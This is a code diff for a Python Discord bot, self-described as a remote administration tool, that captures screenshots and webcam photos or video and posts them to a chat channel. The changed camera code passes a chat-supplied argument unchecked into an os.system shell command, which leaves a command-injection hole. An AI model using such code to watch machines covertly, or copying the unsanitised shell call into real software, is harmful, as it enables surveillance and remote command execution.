@@ -18,7 +18,7 @@ from mss import mss
 from lib.input_commands import InputCommands
 
 # Dependency of camera
-from lib.camera_control import CameraControl
+#from lib.camera_control import CameraControl #commented because of the workaround
 
 # Here you can modify the bot's prefix and description and whether it sends help in direct messages or not.
 client = Bot(description="A remote administration tool for discord", command_prefix="!", pm_help = False)
@@ -155,7 +155,7 @@ async def logoff(seconds = 0):
 # Module: screenshot
 # Description: Takes a screenshot and sends it back
 # Usage: !screenshot or !screenshot secondsToScreenshot
-# Dependencies: time, os, mss
+# Dependencies: vc2, datetime, timedelta, sys, asyncio
 @client.command(pass_context = True)
 async def screenshot(ctx, seconds = 0):
 	if os.path.isfile('screenshot.png'):  # Check if a screenshot.png exists, if yes, delete it so it can be replaced
@@ -210,13 +210,16 @@ async def media(command,times=1):
 @client.command(pass_context = True)
 async def camera(ctx, command, time=5):
 	await client.say('Recording!')
+	python_alias = LocalCredentials.PYTHON_ALIAS
 	
 	if command == 'photo':
-		CameraControl.photo_capture()
+# 		CameraControl.photo_capture()
+		os.system("{} lib/camera_control.py photo".format(python_alias))#workaround
 		await client.send_file(ctx.message.channel, 'photo.jpg')
 		
 	if command == 'video':
-		await CameraControl.video_capture(time=time)
+# 		await CameraControl.video_capture(time=time)
+		os.system("{} lib/camera_control.py video {}".format(python_alias,time))#workaround
 		await client.send_file(ctx.message.channel, 'video.avi')
 	
 	
